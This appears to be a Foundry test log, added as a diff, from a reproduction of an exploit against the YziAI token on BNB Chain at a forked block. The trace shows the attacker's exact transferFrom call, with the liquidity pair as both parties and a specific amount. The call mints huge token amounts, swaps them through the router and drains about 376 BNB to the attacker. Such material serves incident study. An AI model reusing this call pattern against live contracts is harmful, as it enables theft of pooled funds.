@@ -1,0 +1,89 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/YziAIToken_exp.sol:YziAIToken_exp
+[PASS] testExploit() (gas: 256786)
+Logs:
+  BNB balance before attack: 0.296582649660877463
+  BNB balance after attack: 376.368730635312316582
+
+Traces:
+  [10628] YziAIToken_exp::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 47838544 [4.783e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Attacker: [0x63FC3fF98De8d5cA900e68E6c6F41a7CA949c453], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(YziAI: [0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3], "YziAI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], "0xc355_Cake-LP")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [279486] YziAIToken_exp::testExploit()
+    ├─ emit log_named_decimal_uint(key: "BNB balance before attack", val: 296582649660877463 [2.965e17], decimals: 18)
+    ├─ [0] VM::startPrank(Attacker: [0x63FC3fF98De8d5cA900e68E6c6F41a7CA949c453])
+    │   └─ ← [Return]
+    ├─ [261991] YziAI::transferFrom(0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], 0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], 1199002345 [1.199e9])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: YziAI: [0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3], value: 10000000000000000000000000000000 [1e31])
+    │   ├─ emit Approval(owner: YziAI: [0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3], spender: Recovery: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 100000000000000000000000000000000 [1e32])
+    │   ├─ [275] Recovery::WETH() [staticcall]
+    │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   ├─ [123014] Recovery::swapExactTokensForETH(26670942645701260714092677000 [2.667e28], 1, [0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], Attacker: [0x63FC3fF98De8d5cA900e68E6c6F41a7CA949c453], 11743097389 [1.174e10])
+    │   │   ├─ [2893] 0xc355_Cake-LP::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 26670942645701260714092677 [2.667e25], 376449162670348834046 [3.764e20], 1743095082 [1.743e9]
+    │   │   ├─ [25007] YziAI::transferFrom(YziAI: [0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3], 0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], 26670942645701260714092677000 [2.667e28])
+    │   │   │   ├─ [275] Recovery::WETH() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   │   ├─ [2676] Recovery::getPair(YziAI: [0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000b53c43debcdb1055620d17d0d3ae3cc63ece0919
+    │   │   │   ├─ emit Transfer(from: YziAI: [0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3], to: 0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], value: 26670942645701260714092677000 [2.667e28])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x7286de8398f670ea6e559730804a500f700e7f0231ff4fd1fa661169fe70e389: 0x00000000000000000000000000000000000004ee2d6d415b85acef8100000000 → 0x00000000000000000000000000000000000004edd73f9191963e71c0b3ddb878
+    │   │   │   │   @ 0xbfff8a72deeec0a77c391d77c2f271bdedb377f7e8cadcf891d142fc5b6f9756: 0x000000000000000000000000000000000000000000160fcab2abe2f1169aa885 → 0x00000000000000000000000000000000000000005643bf94a21a60b162bcf00d
+    │   │   │   │   @ 0xfdffc1715187147b309aef5e07fb9fde5f71702abcbf1e8d86da03d525df85d2: 0x000000000000000000000000000000000000007e37be2022c0914b2680000000 → 0x000000000000000000000000000000000000007de1907058d122cd6633ddb878
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [67226] 0xc355_Cake-LP::swap(0, 376072147985651439119 [3.76e20], Recovery: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   ├─ [29962] WBNB::transfer(Recovery: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 376072147985651439119 [3.76e20])
+    │   │   │   │   ├─ emit Transfer(from: 0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], to: Recovery: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 376072147985651439119 [3.76e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xc45af47837002edc82f0aae70fd8cedcd81216aa7f94ce15c2820d3a88618b40: 0x000000000000000000000000000000000000000000000014684816ef7f6214fe → 0x000000000000000000000000000000000000000000000000053b6cdbb47e7eef
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000014630caa13cae3960f
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [918] YziAI::balanceOf(0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919]) [staticcall]
+    │   │   │   │   └─ ← [Return] 26697613588346961974806769677 [2.669e28]
+    │   │   │   ├─ [534] WBNB::balanceOf(0xc355_Cake-LP: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919]) [staticcall]
+    │   │   │   │   └─ ← [Return] 377014684697394927 [3.77e17]
+    │   │   │   ├─ emit Sync(reserve0: 26697613588346961974806769677 [2.669e28], reserve1: 377014684697394927 [3.77e17])
+    │   │   │   ├─ emit Swap(sender: Recovery: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 26670942645701260714092677000 [2.667e28], amount1In: 0, amount0Out: 0, amount1Out: 376072147985651439119 [3.76e20], to: Recovery: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x67e5852a000000000014684816ef7f6214fe000000160fcab2abe2f1169aa885 → 0x67e58e2d000000000000053b6cdbb47e7eef00005643bf94a21a60b162bcf00d
+    │   │   │   │   @ 10: 0x0000000000000000000000000010c9803e4492ba9f14a088cdd2850396bfbc90 → 0x0000000000000000000000000010d33e4309bc608d5c3dfe7b45bb9b8296323d
+    │   │   │   │   @ 9: 0x00000000000000000000000000000000000054be58b514a488d2816e573acfd8 → 0x0000000000000000000000000000000000005d145a10e43a9279b0384249be13
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [9223] WBNB::withdraw(376072147985651439119 [3.76e20])
+    │   │   │   ├─ [83] Recovery::fallback{value: 376072147985651439119}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Withdrawal(src: Recovery: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 376072147985651439119 [3.76e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000014630caa13cae3960f → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] Attacker::fallback{value: 376072147985651439119}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000562dafc9ef6e7dc04c224788000000000000000000000000000000000000000000000014630caa13cae3960f
+    │   ├─  storage changes:
+    │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1eb5: 0 → 0x0000000000000000000000007fdff64bf87bad52e6430bda30239bd182389ee3
+    │   │   @ 2: 0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000 → 0x000000000000000000000000000000000000007e3af94e5f6061cb6368000000
+    │   │   @ 13: 0 → 2
+    │   │   @ 0xfdffc1715187147b309aef5e07fb9fde5f71702abcbf1e8d86da03d525df85d2: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1eb6: 0 → 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   @ 0x7286de8398f670ea6e559730804a500f700e7f0231ff4fd1fa661169fe70e389: 0 → 0x00000000000000000000000000000000000004ee2d6d415b85acef8100000000
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "BNB balance after attack", val: 376368730635312316582 [3.763e20], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.17s (6.92s CPU time)
+
+Ran 1 test suite in 13.80s (8.17s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
